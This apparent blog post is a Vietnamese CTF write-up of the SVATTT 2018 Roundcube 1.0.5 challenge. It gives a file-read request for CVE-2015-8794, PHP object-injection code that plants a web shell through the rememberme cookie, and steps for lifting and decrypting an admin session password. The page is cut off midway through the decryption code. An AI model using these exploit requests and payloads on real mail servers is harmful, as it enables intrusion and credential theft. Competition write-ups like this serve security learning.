@@ -1,0 +1,459 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>Hugo Theme  | SVATTT final 2018 - roundcube mail</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bulma/0.7.1/css/bulma.min.css" />
+    <link rel="stylesheet" href="https://hungry-visvesvaraya-d246d6.netlify.com/css/blog.css" />
+    
+</head>
+<body>
+
+    
+    <nav class="navbar is-fixed-top" role="navigation" aria-label="main navigation">
+        <div class="navbar-brand">
+            <a class="navbar-item" href="https://hungry-visvesvaraya-d246d6.netlify.com/">Home</a>
+            <a class="navbar-item" href="https://hungry-visvesvaraya-d246d6.netlify.com/about">About</a>
+        </div>
+    </nav>
+    
+
+    
+    <section class="hero is-info is-medium">
+        <div class="hero-body" style="background-image: url(https://hungry-visvesvaraya-d246d6.netlify.com/img/bg-blog.jpg);">
+            <div class="container has-text-centered">
+                <br>
+                <h1 class="title is-size-1">
+                    
+                        SVATTT final 2018 - roundcube mail
+                    
+                </h1>
+                
+            </div>
+        </div>
+    </section>
+
+
+<div class="container">
+    <div class="section">
+    
+
+<div class="columns">
+    <div class="column is-9">
+        <div class="tile is-child box">
+            <div class="content">
+                
+
+<figure>
+    <img src="https://hungry-visvesvaraya-d246d6.netlify.com/images/posts/svattt18_final_1.jpg"/> 
+</figure>
+
+
+<h1 id="mô-tả">Mô tả</h1>
+
+<blockquote>
+<p>Roundcube 1.0.5 có 3 lỗi<br />
+Tài khoản: guest/guest<br />
+Thư mục web /opt/lampp/htdocs<br />
+Source: <a href="https://hungry-visvesvaraya-d246d6.netlify.com/resources/svattt18/roundcube.part1.rar">part1</a>, <a href="https://hungry-visvesvaraya-d246d6.netlify.com/resources/svattt18/roundcube.part2.rar">part2</a></p>
+</blockquote>
+
+<h1 id="ý-tưởng">Ý tưởng</h1>
+
+<blockquote>
+<p>Lỗi 1: CVE-2015-8794<br />
+Lỗi 2: PHP Object Injection (cách 2 - cách noob <img 
+	src="https://hungry-visvesvaraya-d246d6.netlify.com/emoji/lovemachine.gif" 
+	width="30px" height="30px" 
+	style="display: inline;" 
+/> )<br />
+Lỗi 3: Đăng nhập admin</p>
+</blockquote>
+
+<h1 id="tâm-tư-của-tác-giả">Tâm tư của tác giả</h1>
+
+<p>Mặc dù theo dòng sự kiện scandal đang nóng hỏi trên facebook nhưng bài này chỉ nói về kỹ thuật không có kích động thù địch gì cả. Tôi writeup bài này sau khi cuộc thi kết thúc và cũng là đội thua cuộc (#2) nên chẳng muốn nói gì hơn là ngậm ngùi :(<br />
+Đề bài không có kỹ thuật mới và không khó nhưng vẫn là dạng bài hay mặc dù 8 tiếng trong cuộc thi attack/defense không đủ để thí sinh làm tất cả các lỗi mà phải bận tâm vào nhiều thứ khác. Nếu có thể gia tăng thời gian lên 2 ngày thì hay quá !!!</p>
+
+<h1 id="chi-tiết">Chi tiết</h1>
+
+<h2 id="lỗi-1-cve-2015-8794">Lỗi 1:  CVE-2015-8794</h2>
+
+<p>Đọc file <code>CHANGELOG</code> ta tìm được version của roundcube là 1.0.5. Có rất nhiều cve nhưng version này khá cũ từ 2015 nên có vẻ CVE-2015-X sẽ hợp lý hơn</p>
+
+<figure>
+    <img src="https://hungry-visvesvaraya-d246d6.netlify.com/images/posts/svattt18_final_02.jpg"/> 
+</figure>
+
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">83</span><span style="color:#75715e">&lt;?php</span> <span style="color:#75715e">//program/steps/addressbook/photo.inc
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">84</span><span style="color:#75715e">// deliver alt image
+</span><span style="display:block;width:100%;background-color:#3c3d38"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">85</span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>$data <span style="color:#f92672">&amp;&amp;</span> ($alt_img <span style="color:#f92672">=</span> <span style="color:#a6e22e">rcube_utils</span><span style="color:#f92672">::</span><span style="color:#a6e22e">get_input_value</span>(<span style="color:#e6db74">&#39;_alt&#39;</span>, <span style="color:#a6e22e">rcube_utils</span><span style="color:#f92672">::</span><span style="color:#a6e22e">INPUT_GPC</span>)) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">is_file</span>($alt_img)) {
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">86</span>    $data <span style="color:#f92672">=</span> <span style="color:#a6e22e">file_get_contents</span>($alt_img);
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">87</span>}
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">88</span></code></pre></div>
+
+<p>Mục addressbook ở <code>/?_task=addressbook</code> nhận request tham số <code>_alt</code> mà không filter dữ liệu đầu vào, dẫn đến đọc bất kì file nào thông qua file_get_contents
+Lỗi này đơn giản nên tôi không nói kỹ, payload khai thác như sau:</p>
+
+<pre><code>GET /?_task=addressbook&amp;_photo=21542765594039404100&amp;_source=collected&amp;_action=photo&amp;_alt=/opt/lampp/htdocs/config/config.inc.php HTTP/1.1
+Host: proxy.svattt2018.com
+Cookie: roundcube_sessid=9gi796bomddm9otl585hssa1t5; XDEBUG_SESSION=1; roundcube_sessauth=S9184f9910452f5bb647294adcfacbd34bc8aa5d2; language=en_US
+Connection: close
+</code></pre>
+
+<h2 id="lỗi-2-php-object-injection">Lỗi 2: PHP Object Injection</h2>
+
+<p>Tôi phát hiện lỗi này bằng cách tìm theo keyword <code>unserialize</code>, challenge sử dụng rất nhiều hàm nguy hiểm nhưng yêu cầu cần phải có gadget để thực thi được payload đó là hàm _destruct và _wakeup. Tiếp tục tìm 2 keyword đó thì tìm được 2 vị trí đáng chú ý.</p>
+
+<p><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">49</span><span style="color:#75715e">&lt;?php</span> <span style="color:#75715e">//program/lib/Roundcube/rcube_image.php
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">50</span><span style="color:#75715e"></span><span style="color:#66d9ef">function</span> __destruct()
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">51</span>{
+<span style="display:block;width:100%;background-color:#3c3d38"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">52</span>    <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">file_get_contents</span>(<span style="color:#e6db74">&#34;&lt;img src=&#39;data:image/jpeg;base64,&#39;&#34;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">base64_encode</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">image_file</span>)<span style="color:#f92672">.</span><span style="color:#e6db74">&#34; /&gt;&#34;</span>);
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">53</span>}
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">54</span></code></pre></div>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">14</span><span style="color:#75715e">&lt;?php</span> <span style="color:#75715e">//plugins/auto_address/auto_address.php
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">15</span><span style="color:#75715e"></span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __destruct()
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">16</span>{
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">17</span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">_fn_close</span>)) {
+<span style="display:block;width:100%;background-color:#3c3d38"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">18</span>        <span style="color:#a6e22e">call_user_func</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">_fn_close</span>);
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">19</span>    }
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">20</span>}
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">21</span></code></pre></div></p>
+
+<p>Tôi mất xíu thời gian để xây dựng payload cho gadget file rcube_image.php nhưng rồi nhận ra dòng code này luôn luôn sai và không bao giờ được chạy đúng <img 
+	src="https://hungry-visvesvaraya-d246d6.netlify.com/emoji/burn_joss_stick.gif" 
+	width="30px" height="30px" 
+	style="display: inline;" 
+/>
+Với gadget 2 ta có thể gọi bất kì function nào mà không dùng parameter. Có vẻ không có function có thể exploit mà không cần truyền param cả, hoặc là có mà bạn phát hiện thì hãy comment phía dưới để chỉ tôi biết. Nếu đây là nơi mà tác giả dẫn dắt ta đến thì có vẻ sẽ có 1 function nào đó đã được định nghĩa trước để ta exploit. Tiếp tục tìm kiếm.</p>
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">106</span><span style="color:#75715e">&lt;?php</span> <span style="color:#75715e">//plugins/auto_address/auto_address.php
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">107</span><span style="color:#75715e"></span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">log</span>(){
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">108</span>    <span style="color:#66d9ef">try</span>{
+<span style="display:block;width:100%;background-color:#3c3d38"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">109</span>        <span style="color:#a6e22e">file_put_contents</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">logfile</span>,$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">content</span>);
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">110</span>    }<span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">Exception</span> $e){
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">111</span>        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;[Auto_address]: Can&#39;t log!&#34;</span>;
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">112</span>    }
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">113</span>}
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">114</span></code></pre></div>
+
+<p>À, lên shell được rồi, chỉ cần thay đổi được biến logfile, content và _fn_close là xong. Quay trở lại vị trí sử dụng hàm unserialize để áp payload vào.</p>
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">89</span><span style="color:#75715e">&lt;?php</span> <span style="color:#75715e">//plugins/rememberme/rememberme.php
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">90</span><span style="color:#75715e"></span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">authenticate</span>($args)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">91</span>{
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">92</span>	<span style="color:#f92672">...</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">93</span>	<span style="color:#75715e">// use only-cookie mechanic to identify the user.
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">94</span><span style="color:#75715e"></span>    $user_info <span style="color:#f92672">=</span> <span style="color:#a6e22e">unserialize</span>(<span style="color:#a6e22e">base64_decode</span>($_COOKIE[$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">cookie_name</span>]));
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">95</span>    <span style="color:#f92672">...</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">96</span>	<span style="color:#66d9ef">return</span> $args;
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">97</span>}
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">98</span></code></pre></div>
+
+<p>Đây là function chức năng remember. Khi login mà check vào ô remember thì một số thông tin cần thiết sẽ được serialize và lưu vào trình duyệt biến <code>_pt</code>. Khi trình duyệt tắt và mở lại, dữ liệu này sẽ được gửi lên server trong trường cookie và mọi session được phục hồi như lúc chưa tắt trình duyệt. Vậy nếu ta áp payload ở đây thì sẽ được unserialize dữ liệu đó.
+Dữ kiện đã đầy đủ, xây dựng payload thôi. Đến đây thế giới như chia làm 2, build payload rất dễ, vài dòng code thôi các bạn có thể tự build. Nhưng tôi muốn các bạn biết 1 cách khác, khó hơn, try hard hơn và &hellip; điên khùng hơn <img 
+	src="https://hungry-visvesvaraya-d246d6.netlify.com/emoji/boss.gif" 
+	width="30px" height="30px" 
+	style="display: inline;" 
+/>
+Tóm tắt các bước là:<br />
+ - Debug để tìm plugin rememberme load ở vị trí nào trong framework<br />
+ - Object auto_address không thể serialize vì nó là PDO object. Dùng trick để có thể serialize<br />
+ - Biến logfile, content, _fn_close là private. Sử dụng php reflection để set giá trị</p>
+
+<pre><code>index.php:42			$RCMAIL = rcmail::get_instance($GLOBALS['env']);
+rcmail.php:77			self::$instance-&gt;startup();
+rcmail.php:127			this-&gt;plugins-&gt;load_plugins((array)$this-&gt;config-&gt;get('plugins', array()), array('filesystem_attachments', 'jqueryui'));
+rcube_plugin_api.php:139    $this-&gt;load_plugin($plugin_name); // $plugin_name=&quot;auto_addrses&quot;
+</code></pre>
+
+<p>Quá trình debug như trên, và tôi thêm 1 đoạn code để bypass những bước liệt kê ở trên ở dòng 200 trong function load_plugin</p>
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79"> 1</span><span style="color:#75715e">&lt;?php</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79"> 2</span><span style="color:#66d9ef">if</span> ($plugin_name <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;auto_address&#34;</span>){
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79"> 3</span>    $myClassReflection <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ReflectionClass</span>(<span style="color:#a6e22e">get_class</span>($plugin));
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79"> 4</span>    <span style="color:#75715e">//
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79"> 5</span><span style="color:#75715e"></span>    $logfile <span style="color:#f92672">=</span> $myClassReflection<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">getProperty</span>(<span style="color:#e6db74">&#39;logfile&#39;</span>);
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79"> 6</span>    $logfile<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79"> 7</span>    $logfile<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">setValue</span>($plugin, <span style="color:#e6db74">&#34;/opt/lampp/htdocs/shell.php&#34;</span>);
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79"> 8</span>    <span style="color:#75715e">//
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79"> 9</span><span style="color:#75715e"></span>    $content <span style="color:#f92672">=</span> $myClassReflection<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">getProperty</span>(<span style="color:#e6db74">&#39;content&#39;</span>);
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">10</span>    $content<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">11</span>    $content<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">setValue</span>($plugin, <span style="color:#e6db74">&#34;&lt;?php echo &#39;Lên shell rồi nhé !!!&#39;;&#34;</span>);
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">12</span>    <span style="color:#75715e">//
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">13</span><span style="color:#75715e"></span>    $_fn_close <span style="color:#f92672">=</span> $myClassReflection<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">getProperty</span>(<span style="color:#e6db74">&#39;_fn_close&#39;</span>);
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">14</span>    $_fn_close<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">15</span>    $_fn_close<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">setValue</span>($plugin, <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#39;auto_address&#39;</span>, <span style="color:#e6db74">&#39;log&#39;</span>));
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">16</span>    <span style="color:#75715e">//
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">17</span><span style="color:#75715e"></span>    $x <span style="color:#f92672">=</span> <span style="color:#a6e22e">serialize</span>($plugin);
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">18</span>    <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">base64_encode</span>($x);
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">19</span>}
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">20</span></code></pre></div>
+
+<p>Và thêm function __sleep() để object có thể serialize vào class auto_address</p>
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">1</span><span style="color:#75715e">&lt;?php</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">2</span><span style="color:#66d9ef">function</span> __sleep(){
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">3</span>	<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#39;logfile&#39;</span>, <span style="color:#e6db74">&#39;content&#39;</span>, <span style="color:#e6db74">&#39;_fn_close&#39;</span>);
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">4</span>}
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">5</span></code></pre></div>
+
+<p>Làm xong lỗi này tôi cảm thấy challenge này hay nhưng chợt nhận ra mình sai sai ở đâu đó. Khuyến nghị không áp dụng ở nhà vì nó quá điên khùng và mất thời gian <img 
+	src="https://hungry-visvesvaraya-d246d6.netlify.com/emoji/beat_plaster.gif" 
+	width="30px" height="30px" 
+	style="display: inline;" 
+/></p>
+
+<h2 id="lỗi-3-đăng-nhập-admin">Lỗi 3: Đăng nhập admin</h2>
+
+<p>Audit source hay vào mysql dễ dàng nhận thấy có 2 user là guest và mailadmin, tác giả cho đăng nhập guest thì đoán flow của bài này là đăng nhập admin.
+Với tài khoản mysql cho trong file config.inc.php <code>$config['db_dsnw'] = 'mysql://roundcube:asdf%401234@localhost/roundcube';</code> tôi đăng nhập lấy được session của bot đăng nhập admin trong bảng session</p>
+
+<pre><code>$ echo bGFuZ3VhZ2V8czo1OiJlbl9VUyI7c2tpbnxzOjY6Im1hYm9sYSI7aW1hcF9uYW1lc3BhY2V8YTo0OntzOjg6InBlcnNvbmFsIjthOjE6e2k6MDthOjI6e2k6MDtzOjA6IiI7aToxO3M6MToiLiI7fX1zOjU6Im90aGVyIjtOO3M6Njoic2hhcmVkIjtOO3M6NjoicHJlZml4IjtzOjA6IiI7fWltYXBfZGVsaW1pdGVyfHM6MToiLiI7dXNlcl9pZHxzOjE6IjIiO3VzZXJuYW1lfHM6NToiZ3Vlc3QiO3N0b3JhZ2VfaG9zdHxzOjk6ImxvY2FsaG9zdCI7c3RvcmFnZV9wb3J0fGk6MTQzO3N0b3JhZ2Vfc3NsfE47cGFzc3dvcmR8czoyNDoiY3BqemgwUHU4b0ljSWRKb2VTWkUyZz09Ijtsb2dpbl90aW1lfGk6MTU0Mjc3NDI2Nzt0YXNrfHM6NDoibWFpbCI7aW1hcF9ob3N0fHM6OToibG9jYWxob3N0IjttYm94fHM6NToiSU5CT1giO3BhZ2V8aToxO3NvcnRfY29sfHM6MDoiIjtzb3J0X29yZGVyfHM6NDoiREVTQyI7U1RPUkFHRV9USFJFQUR8YTozOntpOjA7czoxMDoiUkVGRVJFTkNFUyI7aToxO3M6NDoiUkVGUyI7aToyO3M6MTQ6Ik9SREVSRURTVUJKRUNUIjt9U1RPUkFHRV9RVU9UQXxiOjA7U1RPUkFHRV9MSVNULUVYVEVOREVEfGI6MTtsaXN0X2F0dHJpYnxhOjQ6e3M6NDoibmFtZSI7czo4OiJtZXNzYWdlcyI7czoyOiJpZCI7czoxMToibWVzc2FnZWxpc3QiO3M6NToiY2xhc3MiO3M6NDg6InJlY29yZHMtdGFibGUgbWVzc2FnZWxpc3Qgc29ydGhlYWRlciBmaXhlZGhlYWRlciI7czoxNToib3B0aW9uc21lbnVpY29uIjtzOjQ6InRydWUiO31za2luX3BhdGh8czoxMToic2tpbnMvbGFycnkiO3Vuc2Vlbl9jb3VudHxhOjI6e3M6NToiSU5CT1giO2k6MDtzOjQ6IlNlbnQiO2k6MDt9 | base64 -d
+&gt; language|s:5:&quot;en_US&quot;;skin|s:6:&quot;mabola&quot;;imap_namespace|a:4:{s:8:&quot;personal&quot;;a:1:{i:0;a:2:{i:0;s:0:&quot;&quot;;i:1;s:1:&quot;.&quot;;}}s:5:&quot;other&quot;;N;s:6:&quot;shared&quot;;N;s:6:&quot;prefix&quot;;s:0:&quot;&quot;;}imap_delimiter|s:1:&quot;.&quot;;user_id|s:1:&quot;1&quot;;username|s:9:&quot;mailadmin&quot;;storage_host|s:9:&quot;localhost&quot;;storage_port|i:143;storage_ssl|N;password|s:32:&quot;VXcHgXdbjUag0qskGVDSRWl1jAmgZvCV&quot;;login_time|i:1542768863;timezone|s:16:&quot;America/New_York&quot;;task|s:4:&quot;mail&quot;;imap_host|s:9:&quot;localhost&quot;;mbox|s:5:&quot;INBOX&quot;;page|i:1;sort_col|s:7:&quot;subject&quot;;sort_order|s:4:&quot;DESC&quot;;STORAGE_THREAD|a:3:{i:0;s:10:&quot;REFERENCES&quot;;i:1;s:4:&quot;REFS&quot;;i:2;s:14:&quot;ORDEREDSUBJECT&quot;;}STORAGE_QUOTA|b:0;STORAGE_LIST-EXTENDED|b:1;list_attrib|a:5:{s:4:&quot;name&quot;;s:8:&quot;messages&quot;;s:2:&quot;id&quot;;s:11:&quot;messagelist&quot;;s:5:&quot;class&quot;;s:48:&quot;records-table messagelist sortheader fixedheader&quot;;s:15:&quot;optionsmenuicon&quot;;s:4:&quot;true&quot;;s:7:&quot;columns&quot;;a:8:{i:0;s:7:&quot;threads&quot;;i:1;s:7:&quot;subject&quot;;i:2;s:6:&quot;status&quot;;i:3;s:6:&quot;fromto&quot;;i:4;s:4:&quot;date&quot;;i:5;s:4:&quot;size&quot;;i:6;s:4:&quot;flag&quot;;i:7;s:10:&quot;attachment&quot;;}}skin_path|s:11:&quot;skins/larry&quot;;folders|a:1:{s:5:&quot;INBOX&quot;;a:2:{s:3:&quot;cnt&quot;;i:0;s:6:&quot;maxuid&quot;;i:0;}}unseen_count|a:1:{s:5:&quot;INBOX&quot;;i:0;}
+</code></pre>
+
+<p>Trong đây có chứa password admin là <code>VXcHgXdbjUag0qskGVDSRWl1jAmgZvCV</code> nhưng có vẻ bị mã hóa rồi. Bước tiếp là tìm function decrypt trong roundcube để giải mã</p>
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">840</span><span style="color:#75715e">&lt;?php</span> <span style="color:#75715e">//program/lib/Roundcube/rcube.php
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">841</span><span style="color:#75715e"></span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">decrypt</span>($cipher, $key <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;des_key&#39;</span>, $base64 <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">842</span>{
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">843</span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>$cipher) {
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">844</span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;&#39;</span>;
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">845</span>    }
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">846</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">847</span>    $cipher <span style="color:#f92672">=</span> $base64 <span style="color:#f92672">?</span> <span style="color:#a6e22e">base64_decode</span>($cipher) <span style="color:#f92672">:</span> $cipher;
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">848</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">849</span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">function_exists</span>(<span style="color:#e6db74">&#39;mcrypt_module_open&#39;</span>) <span style="color:#f92672">&amp;&amp;</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">850</span>        ($td <span style="color:#f92672">=</span> <span style="color:#a6e22e">mcrypt_module_open</span>(<span style="color:#a6e22e">MCRYPT_TripleDES</span>, <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#a6e22e">MCRYPT_MODE_CBC</span>, <span style="color:#e6db74">&#34;&#34;</span>))
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">851</span>    ) {
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">852</span>        $iv_size <span style="color:#f92672">=</span> <span style="color:#a6e22e">mcrypt_enc_get_iv_size</span>($td);
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">853</span>        $iv <span style="color:#f92672">=</span> <span style="color:#a6e22e">substr</span>($cipher, <span style="color:#ae81ff">0</span>, $iv_size);
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">854</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">855</span>        <span style="color:#75715e">// session corruption? (#1485970)
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">856</span><span style="color:#75715e"></span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strlen</span>($iv) <span style="color:#f92672">&lt;</span> $iv_size) {
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">857</span>            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;&#39;</span>;
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">858</span>        }
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">859</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">860</span>        $cipher <span style="color:#f92672">=</span> <span style="color:#a6e22e">substr</span>($cipher, $iv_size);
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">861</span>        <span style="color:#a6e22e">mcrypt_generic_init</span>($td, $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">config</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">get_crypto_key</span>($key), $iv);
